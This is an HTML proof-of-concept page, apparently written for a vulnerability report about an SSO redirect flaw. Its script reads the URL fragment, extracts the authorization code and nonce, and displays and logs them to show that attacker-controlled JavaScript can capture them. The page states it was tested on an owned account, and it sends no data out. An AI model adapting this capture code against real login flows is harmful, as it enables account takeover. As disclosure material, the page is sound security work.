<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SSO Redirect PoC</title>

  <style>
    body {
      max-width: 850px;
      margin: 40px auto;
      padding: 20px;
      font-family: Arial, sans-serif;
      background: #f5f5f5;
    }

    .card {
      padding: 24px;
      background: white;
      border: 1px solid #ddd;
      border-radius: 10px;
    }

    pre {
      padding: 14px;
      overflow-wrap: anywhere;
      white-space: pre-wrap;
      background: #eee;
      border-radius: 6px;
    }

    .success {
      font-weight: bold;
    }
  </style>
</head>

<body>
  <div class="card">
    <h1>SSO Redirect PoC</h1>

    <p>
      POC ONLY — tested using an owned account. No authorization code is
      transmitted or stored by this page.
    </p>

    <p id="status">Reading URL fragment...</p>

    <h3>Current URL</h3>
    <pre id="url"></pre>

    <h3>Captured Fragment</h3>
    <pre id="fragment"></pre>

    <h3>Authorization Code</h3>
    <pre id="token"></pre>

    <h3>Nonce</h3>
    <pre id="nonce"></pre>
  </div>

  <script>
    const fragment = window.location.hash || "";
    const params = new URLSearchParams(fragment.replace(/^#/, ""));

    const token = params.get("token");
    const nonce = params.get("nonce");

    document.getElementById("url").textContent = window.location.href;
    document.getElementById("fragment").textContent =
      fragment || "(no fragment received)";
    document.getElementById("token").textContent =
      token || "(no authorization code received)";
    document.getElementById("nonce").textContent =
      nonce || "(no nonce received)";

    const status = document.getElementById("status");

    if (token) {
      status.textContent =
        "SUCCESS: attacker-controlled JavaScript can read the authorization code.";
      status.className = "success";

      console.log("Captured authorization code:", token);
      console.log("Captured nonce:", nonce);
    } else {
      status.textContent = "No authorization code was found in the fragment.";
    }
  </script>
</body>
</html>
